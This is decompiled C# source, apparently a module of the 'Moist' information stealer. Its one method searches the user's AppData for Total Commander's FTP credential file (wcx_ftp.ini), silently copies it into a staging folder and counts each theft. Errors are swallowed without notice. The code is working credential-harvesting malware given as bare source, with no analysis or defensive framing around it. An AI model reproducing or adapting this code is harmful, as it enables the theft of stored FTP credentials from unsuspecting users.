using System;
using System.IO;
using Moist;

// Token: 0x0200004E RID: 78
internal class Class17
{
	// Token: 0x06000220 RID: 544 RVA: 0x00010E80 File Offset: 0x0000F080
	public static void smethod_0(string string_0)
	{
		try
		{
			string text = Help.AppDate + "\\GHISLER\\";
			if (Directory.Exists(text))
			{
				Directory.CreateDirectory(string_0 + "\\FTP\\Total Commander");
			}
			FileInfo[] files = new DirectoryInfo(text).GetFiles();
			for (int i = 0; i < files.Length; i++)
			{
				if (files[i].Name.Contains("wcx_ftp.ini"))
				{
					File.Copy(text + "wcx_ftp.ini", string_0 + "\\FTP\\Total Commander\\wcx_ftp.ini");
					Class17.int_0++;
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000221 RID: 545 RVA: 0x0000446C File Offset: 0x0000266C
	public Class17()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x040000F9 RID: 249
	public static int int_0;
}
